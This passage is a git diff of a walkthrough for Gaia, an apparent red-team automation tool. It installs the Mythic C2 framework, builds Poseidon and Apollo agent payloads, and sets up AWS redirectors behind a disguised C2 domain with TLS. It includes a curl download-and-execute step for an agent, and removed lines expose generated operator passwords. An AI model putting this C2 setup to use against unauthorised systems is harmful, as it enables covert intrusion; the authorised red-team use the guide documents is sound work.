@@ -1,4 +1,4 @@
-First off, ensure you have satisfied the pre-requisites satisfied outlined in the [readme](./README.md#prerequisites). This guide covers an end to end installation and configuration of Mythic though Gaia, including usage of redirectors and custom domains. The domain provider I will be using for this is Porkbun, and the redirectors are in AWS. I am using Debian 13 for both the redirector and Mythic VM as well. 
+First off, ensure you have satisfied the pre-requisites satisfied outlined in the [readme](./README.md#prerequisites). This guide covers an end to end installation and configuration of Mythic though Gaia, including usage of redirectors and custom domains. The domain provider I will be using for this is Porkbun, and the redirectors are in AWS. I am using Debian for both the redirector and Mythic VM as well. 
 
 The main workstation I am executing Gaia from is running Windows 11, but everything should also work in Linux. At the time of publication, I have not tested MacOS. Furthermore, the Mythic VM I have deployed here has an SSH key configured for authentication from my workstation called `id_ed25519`. If you noticed that I don't ever specify it, that's why. Paramiko, the library that handles SSH in Gaia can automatically load common key names. 
 
@@ -20,7 +20,6 @@ Next, we need to create the Python virtual environment.
 PS C:\tools\gaia_guide> cd Gaia
 PS C:\tools\gaia_guide\Gaia> python.exe -m venv .venv
 PS C:\tools\gaia_guide\Gaia> .\.venv\Scripts\Activate.ps1
-(.venv) PS C:\tools\gaia_guide\Gaia>
 ```
 
 Then install dependencies from `requirements.txt`.
@@ -54,13 +53,14 @@ Modules:
     payload                                             Manage payloads in Mythic
     dns                                                 Manage DNS records with 3rd party registrars
     redirector                                          Manage redirector configuration within public clouds
-(.venv) PS C:\tools\gaia_guide\Gaia>
 ```
 # Installing Mythic
-Next, time to install Mythic and it's prerequisites. Note, this takes a while. Go grab some coffee, beer, snacks, whatever you want. Toss on a YouTube video while you are at it and come back to this in a bit. 
+Now, time to install Mythic and it's prerequisites. This will also copy `.env-template` to `.env`, and populate `MYTHIC_LOGIN_SERVER_HOST`, and`MYTHIC_SERVER_USER` with the values given in the install command. I will not be showing mine through this guide because it will have API keys that I actually use and would like to not have cryptominers or AI related charges to my credit card. Note this means if you have the relevant value populated in `.env` already, Gaia will automatically pull it if you don't specify it in the CLI, or will update the value if you do specify it in the CLI.
+
+Note, this takes a while. Go grab some coffee, beer, snacks, whatever you want. Toss on a YouTube video while you are at it and come back to this in a bit. 
 A quick note here is that any server you connect to with Gaia will automatically be added to `~/.ssh/known_hosts`. This is to prevent the need to have Gaia require manual intervention in the event it's deployment were to be entirely scripted out. So, if you check `~/.ssh/known_hosts` and see a bunch of random boxes in there over time, Gaia could be the cause. Especially if you use it to spin up and down redirectors often.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia install --user winterknight -S 192.168.153.133 --install-updates --install-deps --install-mythic
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia install -u winterknight -S 192.168.153.133 --install-updates --install-deps --install-mythic
 ###########################
 # Updating remote system! #
 ###########################
@@ -71,20 +71,36 @@ Hit:3 http://deb.debian.org/debian bookworm-updates **InRelease**
 ###########################
 # Installing Dependencies #
 ###########################
-Updating apt sources!
+#########################
+# Updating apt sources! #
+#########################
 Hit:1 http://deb.debian.org/debian bookworm InRelease
 Hit:2 http://security.debian.org/debian-security bookworm-security InRelease
 Hit:3 http://deb.debian.org/debian bookworm-updates InRelease
 <...snip...>
-Docker install completed
-Cleaning up Docker install script
+#############################
+# Installing prerequisites! #
+#############################
+Reading package lists...
+Building dependency tree...
+<...snip...>
+######################
+# Installing Docker! #
+######################
+[+] Installing Docker for Debian 12
+Reading package lists...
+<...snip...>
+[+] Cleaning up Docker install script
+[+] Docker install completed!
 Cleaning up install_deps.sh script
 #####################################################################
 # Installing Mythic. This will take a while, so go get some coffee. #
 #####################################################################
-****Preparing to install Mythic! Standby!****
-Pulling Mythic Repo
-Building mythic-cli binary
+#########################################
+# Preparing to install Mythic! Standby! #
+#########################################
+[+] Pulling Mythic Repo.
+[+] Building mythic-cli binary.
 <...snip...>
 Cloning into '/opt/Mythic/tmp'...
 WARN[0000] No services to build
@@ -102,22 +118,22 @@ WARN[0000] No services to build
 WARN[0000] No services to build
 [+] up 1/1
  ✔ Container mythic_documentation Started                                   0.3s
-Mythic webserver hosted and ready via HTTPS on port 7443!
-Use mythic_admin:jPzi6uHFtjPkPHEmrVrakay93f1UPC to connect to the C2 server!
-Dumping mythic_admin creds to creds.txt
+[+] Mythic webserver hosted and ready via HTTPS on port 7443!
+[+] Use mythic_admin:<password> to connect to the C2 server!
+[+] Dumping mythic_admin creds to creds.txt
 Cleaning up install_mythic.sh script
 #######################################
 # Dumping mythic creds to local disk! #
 #######################################
 NOTE: If the password for `mythic_admin` is lost, run `grep "MYTHIC_ADMIN_PASSWORD" /opt/Mythic/.env | cut -d '"' -f 2` on the server mythic is installed on.
 ```
-Yes, there are creds in there. No I don't care. The password is randomly generated and this server will be long gone before this hits GitHub. So, now we have Mythic functional. If you are already familiar with Mythic and don't need the rest of Gaia's features, you're off to the races! For the rest of us, let's continue! 
+The password is randomly generated and this server will be long gone before this hits GitHub. So, now we have Mythic functional. If you are already familiar with Mythic and don't need the rest of Gaia's features, you're off to the races! For the rest of us, let's continue! 
 
 # Authenticating to Mythic
 Next up we need to authenticate to Mythic so we can interact with it's API. We see when requesting help with the `auth` command, that there are 2 values pre-populated. Those are defaults that can be overridden.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py auth -h
-usage: gaia auth [-h] -S  -P 7443 -u mythic_admin -p
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia auth -h
+usage: gaia auth [-h] -S  [-P 7443] [-u mythic_admin] -p [-k]
 
 options:
   -h, --help               show this help message and exit
@@ -125,24 +141,24 @@ options:
   -P, --port 7443          Port to access Mythic's web interface
   -u, --user mythic_admin  Target user for Mythic authentication
   -p, --password           Password for target user for Mythic authentication
+  -k, --no-ssl             Don't verify TLS certificates when authenticating to Mythic
 ```
 
 Now, its time to authenticate to Mythic.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py auth -S 192.168.153.133 -u mythic_admin -p
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia auth -S 192.168.153.133 -u mythic_admin -p
 Password:
 API token dumped to .env file
-Mythic authentication successful!
+Mythic authentication successful! JWT dumped to .env!
 ```
-If you inspect your `.env` file, you'll notice that `MYTHIC_LOGIN_SERVER_HOST`, `MYTHIC_LOGIN_SERVER_PORT`, `MYTHIC_API_KEY` and `MYTHIC_SERVER_USER` have automatically been populated for you. I will not be showing mine through this guide because it will have API keys that I actually use and would like to not have cryptominers or AI related charges to my credit card. Note this means if you have the relevant value populated in `.env` already, Gaia will automatically pull it if you don't specify it in the CLI, or will update the value if you do specify it in the CLI.
 
 # User Creation
 Now we have authenticated to Mythic. Let's create new users. We can do this in 2 ways. Either providing username via the CLI or through a file. Let's start with the CLI. We will also output the passwords to the terminal.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py user create -u test1 --cred-stdout
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia user create -u test1 --cred-stdout
 Merging user file and cli specified users into a single list.
 Creating new Mythic users.
-test1:yeuUermiGvsjqnDZ
+test1:<password>
 ```
 So now we could either log into the Mythic UI directly with those credentials, or through the `auth` command. 
 
@@ -154,15 +170,15 @@ test3
 
 Then we use the file to create new users. Here we also dump the creds to `creds.txt`, also in the Gaia project root.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py user create -l users.txt -d creds.txt
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia user create -l users.txt -d creds.txt
 Reading user list from file.
 Merging user file and cli specified users into a single list.
 Creating new Mythic users.
 Dumping new Mythic user credentials to disk.
 
-(.venv) PS C:\tools\gaia_guide\Gaia> type .\creds.txt
-test2:0pcDmnTuGVHOOtSZ
-test3:64XzePIPp8CxRsPz
+(.venv) PS C:\tools\gaia_guide\Gaia> cat creds.txt
+test2:<password>
+test3:<password>
 ```
 
 We can even combine the 2 methods! First update `users.txt` to generate new users. 
@@ -171,56 +187,102 @@ test4
 test5
 ```
 
-Then fire it off again, but this time adding a 3rd user. We specified `test6` in the CLI then dump all the new creds `creds.txt`, appending to the file.
+Then fire it off again, but this time adding a 3rd user with `-u`. 
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> type .\creds.txt
-test2:0pcDmnTuGVHOOtSZ
-test3:64XzePIPp8CxRsPz
-test4:kIiUMnllHH2L48KP
-test5:OuCajjPD3LseR0Ko
-test6:2ywzXrH0DQS3XWDB
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia user create -l users.txt -d creds.txt -u test6
+Reading user list from file.
+Merging user file and cli specified users into a single list.
+Creating new Mythic users.
+Dumping new Mythic user credentials to disk.
 ```
 
-Note that if you end up specifying the same user, you could have some issues. I'd recommend going into Hasura and deleting the user records from the operator table and re-creating them. In case of a user conflict, use the older credentials if you don't want to go to hasura to delete the users first. You can get to Hasura in the Mythic UI, then retrieve the password by running `sudo cat /opt/Mythic/.env | grep HASURA_SECRET`. Future versions of Gaia will support more robust user management.
+We specified `test6` in the CLI then dump all the new creds `creds.txt`, appending to the file.
+```
+(.venv) PS C:\tools\gaia_guide\Gaia> cat creds.txt
+test2:<password>
+test3:<password>
+test4:<password>
+test5:<password>
+test6:<password>
+```
+
+Note that if you end up specifying the same user, Mythic will silently skip user creation on the backend. I'd recommend going into Hasura and deleting the user records from the operator table and re-creating them. In case of a user conflict, use the older credentials if you don't want to go to hasura to delete the users first. You can get to Hasura in the Mythic UI, then retrieve the password by running `sudo cat /opt/Mythic/.env | grep HASURA_SECRET`. Future versions of Gaia will support more robust user management.
 
 # Operation Creation
 Now, let's check out what operations are available to us.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py operation list
-Current operations in Mythic:
-Operation Chimera
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py operation list
++-------------------+--------------+
+|   Operation Name  | Operation ID |
++-------------------+--------------+
+| Operation Chimera |      1       |
++-------------------+--------------+
 ```
 Looks like it's just the default Operation Chimera. Since this is a fresh install, this is expected. 
 
 Next up, time to create a new operation and assign some users. Lets start by creating a new operation. Creating a new operation will also update `MYTHIC_OPERATION_NAME` in `.env`.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py operation create -n SpecterOp
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia operation create -n SpecterOp
+Creating new operation: SpecterOp
+```
+Verify that the operations was created correctly
+```
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py operation list
++-------------------+--------------+
+|   Operation Name  | Operation ID |
++-------------------+--------------+
+| Operation Chimera |      1       |
+|     SpecterOp     |      2       |
++-------------------+--------------+
 ```
 
-Now let's assign a few users to this operation. Note this feature does not yet support feeding users from a file, but it is planned for the future.
+Now lets see how to add users to an operation. 
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py operation assign -o SpecterOp -u test1 test2 test3
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia operation assign -h
+usage: gaia operation assign [-h] -o  -u  [ ...] [-l path/to/file]
+
+options:
+  -h, --help                    show this help message and exit
+  -o, --operation-name          Assign users to target operation
+  -u, --users  [ ...]           Users to be assigned to target operation
+  -l, --user-list path/to/file  Location of file containing Mythic users to be added to operation
+```
+
+Let's add `test3`, `test4` and `test5` to the newly created operation `SpecterOp`. Notice that you can combine user input for operation assignment the same way you can for user creation.
+```
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py operation assign -o SpecterOp -u test3 -l ./users.txt
+Reading user list from file
+Merging user file and cli specified users into a single list.
 Assigning users to operation
-Assigned user test1 to operation SpecterOp
-Assigned user test2 to operation SpecterOp
-Assigned user test3 to operation SpecterOp
-```
-
-Optional: Next, I'll add Mythic webhooks to Discord. We use these when monitoring callbacks and errors. 
-```
-(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py operation webhook config discord --url https://discord.com/api/webhooks/<server_id>/<string> -o "SpecterOp"
+Assigned test3 to SpecterOp
+Assigned test4 to SpecterOp
+Assigned test5 to SpecterOp
 ```
 
 # Payload Creation
-Okay, we have some users, and we have some operations. Let's start by getting a local payload. This payload will be executed from the Mythic server because I am lazy and don't want to spin up another VM. We can use either Athena or Poseidon for this. I prefer Poseidon personally. The amount of time it will take to build these payloads will vary greatly based on how powerful your Mythic server is. You can safely ignore that last line, I'm not sure what causes it yet but it's harmless. When you execute this command, `.env` updates the `MYTHIC_HTTP_CALLBACK_URL_BASE`, `MYTHIC_HTTP_CALLBACK_PORT`, and `MYTHIC_HTTP_CALLBACK_KILLDATE` values.
+Okay, we have some users, and we have some operations. Let's start by getting a local payload. This payload will be executed from the Mythic server because I am lazy and don't want to spin up another VM. We can use either Athena or Poseidon for this. I prefer Poseidon personally, so that's what I will use. First let's check out the help.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py payload create poseidon -n notposeidon -u http://192.168.153.133 -k 2026-08-09 -p 80 -o linux
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py payload create poseidon -h
+usage: gaia payload create poseidon [-h] -n  [-u ] [-p 80] [-k ] -o {linux,macos}
+
+options:
+  -h, --help                show this help message and exit
+  -n, --name                Name of generated payload before file extensions
+  -u, --callback-url        URL (excluding port) the C2 agents will connect to
+  -p, --callback-port 80    Port that C2 agents will connect to
+  -k, --callback-killdate   Target date after which the C2 agents will no longer run (YYYY-MM-DD)
+  -o, --os {linux,macos}    Build C2 agents for the target operating system
+```
+The amount of time it will take to build these payloads will vary greatly based on how powerful your Mythic server is. By default, the `http` C2 profile in Mythic listens on port 80, which is why that's the port specified here. Also, you can safely ignore that last line, I'm not sure what causes it yet but it's harmless. 
+```
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py payload create poseidon -n notmalware -u http://192.168.153.133 -k 2026-09-30 -p 80 -o linux
 Poseidon linux x64 elf building
 Poseidon linux x64 elf built
 Poseidon linux arm64 elf building
 Poseidon linux arm64 elf built
 Ignoring exception in _clean_close: ConnectionClosedError(None, None, None)
 ```
+When you execute this command, `.env` updates the `MYTHIC_HTTP_CALLBACK_URL_BASE`, `MYTHIC_HTTP_CALLBACK_PORT`, and `MYTHIC_HTTP_CALLBACK_KILLDATE` values. 
 
 If you check out the web UI, you'll see 2 Poseidon payloads waiting for you.
 ![Poseidon payloads im Mythic UI](readme_images/poseidon_create.png)
@@ -228,24 +290,24 @@ If you check out the web UI, you'll see 2 Poseidon payloads waiting for you.
 
 On the x64 Static ELF, I'll click on Actions > View Payload Configuration > Right-click URL > Copy Link. Then go to your Mythic VM (or another Linux VM). We are using curl to pull down the payload, `-k` to ignore curl's certificate warning, then `-o` to specify the file output name. Next, change the permissions to allow execution before executing the payload.
 ```
-winterknight@debian:~$ curl -k https://192.168.153.133:7443/direct/download/8724261d-879c-4b16-ad7d-9591ef28073e -o poseidon
+winterknight@debian:~$ curl -k https://192.168.153.133:7443/direct/download/3d7f94e3-25df-45f7-b073-bf3d49e95853 -o poseidon
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
-100 8578k  100 8578k    0     0   446M      0 --:--:-- --:--:-- --:--:--  465M
+100 8578k  100 8578k    0     0   476M      0 --:--:-- --:--:-- --:--:--  465M
 winterknight@debian:~$ chmod 770 poseidon 
-winterknight@debian:~$ ./poseidon 
+winterknight@debian:~$ ./poseidon
 ```
 
 Once you execute the payload, the terminal will hang. If you go back to your Mythic UI, you should see a callback waiting for you.
 ![Callback in Mythic UI](readme_images/poseidon_callback.png)
 
 
-If you were only looking for how to use Gaia locally, or in a lab, you're all done here! At this point it's time to showcase using Gaia to create payloads that go over the internet and through redirectors before landing in your Mythic server!
+If you were only looking for how to use Gaia locally, or in a lab, you're all done here! At this point I'll showcase some additional, optional features of Gaia. Feel free to stick around if you are curious.
 
 # Shifting to redirectors
 Next, let's create an Apollo payload that goes to `www.thislookslegit.net` for use with a redirector we will create later. We are doing this over https and specifying port 443 this time. Note you want this to be a domain you own so you can create records for it. 
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py payload create apollo -n notapollo -u https://www.thislookslegit.net -k 2026-08-09 -p 443
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py payload create apollo -n notapollo -u https://www.thislookslegit.net -k 2026-08-09 -p 443
 Apollo portable executable building
 Apollo portable executable built
 Apollo shellcode building
@@ -253,6 +315,7 @@ Apollo shellcode built
 Apollo service executable building
 Apollo service executable built
 Ignoring exception in _clean_close: ConnectionClosedError(None, None, None)
+(.venv) PS C:\tools\gaia_guide\Gaia>
 ```
 
 If you check Mythic again, you'll see the new payloads in the payloads menu.
@@ -261,35 +324,36 @@ If you check Mythic again, you'll see the new payloads in the payloads menu.
 ## Creating Redirectors
 So, next we need to create a redirector. Fortunately, the help menu in Gaia essentially acts as a todo list, with the exception of delete. Deleting infra just after making it would be silly.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector -h
-usage: gaia redirector [-h] {create,delete,certbot,generate,tunnel} ...
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia redirector -h
+usage: gaia redirector [-h] {create,delete,list,certbot,generate,tunnel} ...
 
 options:
-  -h, --help                               show this help message and exit
+  -h, --help                                    show this help message and exit
 
 Redirector Actions:
   Manage redirectors
 
-  {create,delete,certbot,generate,tunnel}
-    create                                 Create a new redirector
-    delete                                 Delete a redirector
-    certbot                                Install Certbot and enable HTTPS on a redirector
-    generate                               Generate redirector rules based on existing payload in Mythic and upload them to redirector
-    tunnel                                 Configure SSH tunnel between Mythic server and redirector
+  {create,delete,list,certbot,generate,tunnel}
+    create                                      Create a new redirector
+    delete                                      Delete a redirector
+    list                                        Show current redirector infrastructure
+    certbot                                     Install Certbot and enable HTTPS on a redirector
+    generate                                    Generate redirector rules based on existing payload in Mythic and upload them to redirector
+    tunnel                                      Configure SSH tunnel between Mythic server and redirector
 ```
 
 First up, creating the redirector. As of now, only AWS is supported but Azure is planned to be supported in the future. Let's get the help menu.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector create aws -h
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py redirector create aws -h
 usage: gaia redirector create aws [-h] [-a] [-s] -S {t2.small,t2,medium,t3.micro,t3.small,t3.medium} [-r REGION] -o {debian,ubuntu}
 
 options:
-  -h, --help                                                            show this help message and exit
-  -a, --access-key                                                      Enter the AWS access key when requested
-  -s, --secret-key                                                      Enter the AWS secret key when requested
-  -S, --size {t2.micro,t2.small,t2,medium,t3.micro,t3.small,t3.medium}  Size of redirector EC2
-  -r, --region REGION                                                   Create redirector in target AWS region
-  -o, --os {debian,ubuntu}                                              Specify OS for the redirector
+  -h, --help                                                   show this help message and exit
+  -a, --access-key                                             Enter the AWS access key when requested
+  -s, --secret-key                                             Enter the AWS secret key when requested
+  -S, --size {t2.small,t2,medium,t3.micro,t3.small,t3.medium}  Size of redirector EC2
+  -r, --region REGION                                          Create redirector in target AWS region
+  -o, --os {debian,ubuntu}                                     Specify OS for the redirector
 ```
 
 Now that we know what levers we have to pull, let's create a redirector! Like with Mythic installation, this takes some time. To build the redirector, Gaia first performs the following actions:
@@ -310,7 +374,7 @@ Once the EC2 is built, then Gaia handles some post-build configuration:
 
 Here's what all that looks like (to some extent, the output is long). `.env` will update the following values `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_DEFAULT_REGION`, `REDIRECTOR_PUBLIC_IP`, `REDIRECTOR_OS`, `REDIRECTOR_USER`
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector create aws -S t3.micro -r us-east-2 -o debian -a -s
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py redirector create aws -S t3.micro -r us-east-2 -o debian -a -s
 AWS Access Key:
 AWS Secret Key:
 Connecting to AWS
@@ -325,58 +389,123 @@ Updating EC2 before rebooting.
 Get:1 file:/etc/apt/mirrors/debian.list Mirrorlist [38 B]
 Get:2 file:/etc/apt/mirrors/debian-security.list Mirrorlist [47 B]
 <...snip...>
-Successfully installed ConfigArgParse-1.7.5 PyOpenSSL-26.3.0 acme-5.7.0 certbot-5.7.0 certbot-apache-5.7.0 certifi-2026.7.22 cffi-2.1.0 charset_normalizer-3.4.9 configobj-5.0.9 cryptography-49.0.0 distro-1.9.0 idna-3.18 josepy-2.2.0 parsedatetime-2.6 pycparser-3.0 pyrfc3339-2.1.0 python-augeas-1.2.0 requests-2.34.2 urllib3-2.7.0
+Installing collected packages: parsedatetime, urllib3, pyrfc3339, pycparser, idna, distro, configobj, ConfigArgParse, charset_normalizer, certifi, requests, cffi, python-augeas, cryptography, PyOpenSSL, josepy, acme, certbot, certbot-apache
+
+Successfully installed ConfigArgParse-1.7.5 PyOpenSSL-26.4.0 acme-5.8.0 certbot-5.8.0 certbot-apache-5.8.0 certifi-2026.7.22 cffi-2.1.1 charset_normalizer-3.5.1 configobj-5.0.9 cryptography-50.0.1 distro-1.9.0 idna-3.19 josepy-2.2.0 parsedatetime-2.6 pycparser-3.0 pyrfc3339-2.1.0 python-augeas-1.2.0 requests-2.34.2 urllib3-2.7.0
 Cleaning up install_apache.sh script
-EC2 created! Public IP address for the EC2 is 13.59.54.21. The default user for your instance is admin.
+EC2 created! Public IP address for the EC2 is 3.150.116.119. The default user for your instance is admin.
 ```
 
 Next we need to make sure the redirector was spun up properly. We can use redirector list for this.
 ```
-./gaia redirector list aws
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py redirector list aws
 Getting Gaia EC2s from AWS
-Instances in account:
-ID: i-0da415d00a5d16257  Status: running  Size: t3.micro  Arch: x86_64  Public IP: 13.59.54.21
++---------------------+---------+----------+--------+---------------+
+|        EC2 ID       |  Status |   Size   |  Arch  |   Public IP   |
++---------------------+---------+----------+--------+---------------+
+| i-00489c7ffa029399e | running | t3.micro | x86_64 | 3.150.116.119 |
++---------------------+---------+----------+--------+---------------+
 ```
 Gaia determines that a redirector was created by it by tagging `createdBy:gaia` on EC2 resource creation. When Gaia queries for EC2 instances, it uses this tag to determine if it's Gaia affiliated or not, then skips the resource if it's not.
 
 ## DNS Configuration
-We then need to make a quick jump over to DNS config. Time to get an A record created for the server, but first, to figure out what's in our Porkbun account. When we auth to Porkbun with the API keys, the `PORKBUN_API_KEY` and `PORKBUN_SECRET_KEY` gets updated to `.env`.
+We then need to make a quick jump over to DNS config. We will create an A record created for the server. First though, we need to figure out how to, and what domians are available to us.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py dns porkbun list -k -s
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py dns porkbun -h
+usage: gaia dns porkbun [-h] {create,delete,list} ...
+
+options:
+  -h, --help            show this help message and exit
+
+DNS Actions:
+  Specify what operation to perform
+
+  {create,delete,list}
+    create              Create a new domain record
+    delete              Delete a domain record
+    list                List current domain records
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py dns porkbun list -h
+usage: gaia dns porkbun list [-h] [-k] [-s] [-d ]
+
+options:
+  -h, --help        show this help message and exit
+  -k, --api-key     Enter the Porkbun API key when requested
+  -s, --secret-key  Enter the Porkbun secret key when requested
+  -d, --domain      Display records for a given domain
+```
+
+
+ When we auth to Porkbun with the API keys, the `PORKBUN_API_KEY` and `PORKBUN_SECRET_KEY` gets updated to `.env`.
+```
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py dns porkbun list -k -s
 Porkbun API Key:
 Porkbun Secret Key:
-Active domains:
-thislookslegit.net
++--------------------+---------------+-----------+
+|    Domain Name     | Domain Status | Domain ID |
++--------------------+---------------+-----------+
+| thislookslegit.net |     ACTIVE    |     1     |
++--------------------+---------------+-----------+
 ```
 
-The idea here is to have with a blank throwaway domain you'd use for C2 and nothing else. This is best so you don't degrade your trust ratings on your legitimate domains. So, I'm assuming that you have a domain that doesn't have anything else in it. So we can use `thislookslegit.net` as our C2 domain.
+Next lets double check that this domain doesn't have any records in there already.
 ```
-.\gaia.py dns porkbun list --domain thislookslegit.net
-Name: thislookslegit.net  Type: MX  Value: fwd1.porkbun.com
-Name: thislookslegit.net  Type: MX  Value: fwd2.porkbun.com
-Name: thislookslegit.net  Type: NS  Value: curitiba.porkbun.com
-Name: thislookslegit.net  Type: NS  Value: fortaleza.porkbun.com
-Name: thislookslegit.net  Type: NS  Value: maceio.porkbun.com
-Name: thislookslegit.net  Type: NS  Value: salvador.porkbun.com
-Name: thislookslegit.net  Type: TXT  Value: v=spf1 include:_spf.porkbun.com ~all
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py dns porkbun list -d thislookslegit.net
++--------------------+-------------+--------------------------------------+-----------+
+|    Record Name     | Record Type |             Record Value             | Record ID |
++--------------------+-------------+--------------------------------------+-----------+
+| thislookslegit.net |      MX     |           fwd1.porkbun.com           | 558796414 |
+| thislookslegit.net |      MX     |           fwd2.porkbun.com           | 558796415 |
+| thislookslegit.net |      NS     |         curitiba.porkbun.com         | 558796413 |
+| thislookslegit.net |      NS     |        fortaleza.porkbun.com         | 558796412 |
+| thislookslegit.net |      NS     |          maceio.porkbun.com          | 558796410 |
+| thislookslegit.net |      NS     |         salvador.porkbun.com         | 558796411 |
+| thislookslegit.net |     TXT     | v=spf1 include:_spf.porkbun.com ~all | 558796416 |
++--------------------+-------------+--------------------------------------+-----------+
 ```
-Note that the MX, NS, and TXT records are default and pre-populated by Porkbun. Best to leave those alonse. 
+It does, but these are the default ones that come with porkbun, so they are safe to keep in here. The idea here is to use a throwaway domain only for C2 and nothing else. This is so you don't degrade trust in your legitimate domains. Since there are no records in here that are being used for legitimate purposes, we can use `thislookslegit.net` as our C2 domain.
 
-Time to create that A record using the EC2's public IP.
+Time to create that A record using the EC2's public IP. First lets figure out how.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py dns porkbun create -d thislookslegit.net -n www -v 13.59.54.21 -t a
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py dns porkbun create -h
+usage: gaia dns porkbun create [-h] [-k] [-s] [-d ] [-n ] [-v ] [-t {a,aaaa,cname}]
+
+options:
+  -h, --help                        show this help message and exit
+  -k, --api-key                     Enter the Porkbun API key when requested
+  -s, --secret-key                  Enter the Porkbun secret key when requested
+  -d, --domain                      Creates new records in target domain
+  -n, --record-name                 Name of new domain record
+  -v, --record-value                Value of domain record: IP address for A or AAAA record, or FQDN for CNAME alias
+  -t, --record-type {a,aaaa,cname}  Type of domain record to create
+```
+
+Next lets create the A record for the redirector.
+```
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py dns porkbun create -d thislookslegit.net -n www -t a -v 3.150.116.119
 Created requested domain record.
 ```
 
-Let's check Porkbun to make sure the record was added properly. The other domain records come by default with Porkbun and were not added manually by me, or Gaia.
-
-
-![New A Record in Porkbun](readme_images/porkbun_a_create.png)
+Let's check Porkbun to make sure the record was added properly. 
+```
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py dns porkbun list -d thislookslegit.net
++------------------------+-------------+--------------------------------------+-----------+
+|      Record Name       | Record Type |             Record Value             | Record ID |
++------------------------+-------------+--------------------------------------+-----------+
+| www.thislookslegit.net |      A      |            3.150.116.119             | 581218029 |
+|   thislookslegit.net   |      MX     |           fwd1.porkbun.com           | 558796414 |
+|   thislookslegit.net   |      MX     |           fwd2.porkbun.com           | 558796415 |
+|   thislookslegit.net   |      NS     |         curitiba.porkbun.com         | 558796413 |
+|   thislookslegit.net   |      NS     |        fortaleza.porkbun.com         | 558796412 |
+|   thislookslegit.net   |      NS     |          maceio.porkbun.com          | 558796410 |
+|   thislookslegit.net   |      NS     |         salvador.porkbun.com         | 558796411 |
+|   thislookslegit.net   |     TXT     | v=spf1 include:_spf.porkbun.com ~all | 558796416 |
++------------------------+-------------+--------------------------------------+-----------+
+```
 
 ## Requesting TLS Certificates
 Next, creating a certificate with `certbot`. This will enable HTTPS on your redirector site. This will also update `REDIRECTOR_PUBLIC_HOST` in `.env` with the value of `-S`. `-S` can also be the FQDN of the redirector.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector certbot -d www.thislookslegit.net -S 13.59.54.21 -u admin -i C:\\users\\winterknight\\.ssh\\gaia-redir.pem
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py redirector certbot -d www.thislookslegit.net -S www.thislookslegit.net -u admin -i C:\users\winterknight\.ssh\gaia-redir.pem
 Connecting to redirector.
 Running certbot.
 Account registered.
@@ -385,7 +514,7 @@ Requesting a certificate for www.thislookslegit.net
 Successfully received certificate.
 Certificate is saved at: /etc/letsencrypt/live/www.thislookslegit.net/fullchain.pem
 Key is saved at:         /etc/letsencrypt/live/www.thislookslegit.net/privkey.pem
-This certificate expires on 2026-10-25.
+This certificate expires on 2026-12-03.
 These files will be updated when the certificate renews.
 
 Deploying certificate
@@ -404,18 +533,21 @@ If you like Certbot, please consider supporting our work by:
 ## Generate redirector rules
 Time to get the UUID of a payload so we can create our `mod_rewrite` rules for it. In this case we want the `notapollo.exe` payload.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py payload list
-Current Payloads:
-{'payload_uuid': 'b427f8ba-b392-4329-b320-6bab1a3e45fb', 'payload_type': 'poseidon', 'payload_file_name': 'notposeidon', 'payload_description': 'Linux arm64 Static ELF'}
-{'payload_uuid': '2cdd6126-a7bd-432b-9834-e2e837769bb6', 'payload_type': 'poseidon', 'payload_file_name': 'notposeidon', 'payload_description': 'Linux x64 Static ELF'}
-{'payload_uuid': '03034993-538a-4f2f-8b5a-51d9b4bb854a', 'payload_type': 'apollo', 'payload_file_name': 'notapollo.bin', 'payload_description': 'Windows x64 Shellcode'}
